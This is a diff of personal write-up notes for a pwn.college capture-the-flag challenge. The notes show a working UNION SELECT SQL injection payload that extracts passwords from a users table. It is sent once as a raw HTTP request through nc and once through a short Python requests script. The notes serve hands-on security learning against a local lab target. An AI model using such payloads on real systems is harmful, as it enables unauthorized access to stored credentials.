@@ -20,7 +20,7 @@ sql=SELECT username FROM users WHERE username LIKE "{query}"
 the payload i crafted is: pwn.college{" UNION SELECT password FROM users" -> urlencoded
 -ran: '/challenge/localhost'
 -ran: 'nc -v challenge.localhost 80'
--typed: 'GET /?query=pwn.college%7B%22%20UNION%20SELECT%20password%20FROM%20users%22 HTTP/1.1'
+-typed: 'GET /?query=%22%20UNION%20SELECT%20password%20FROM%20users%22 HTTP/1.1'
         'Host: challenge.localhost'
 -flag popped out
 
@@ -36,7 +36,7 @@ II WAY -> python
                 'p = process("/challenge/server")'
                 'time.sleep(1)'
                 'params = {'
-                        '"query" : "pwn.college{\" UNION SELECT password FROM users\""'
+                        '"query" : "\" UNION SELECT password FROM users\""'
                         '}'
                 'r = requests.get(url, params)'
                 'print(r.text)'
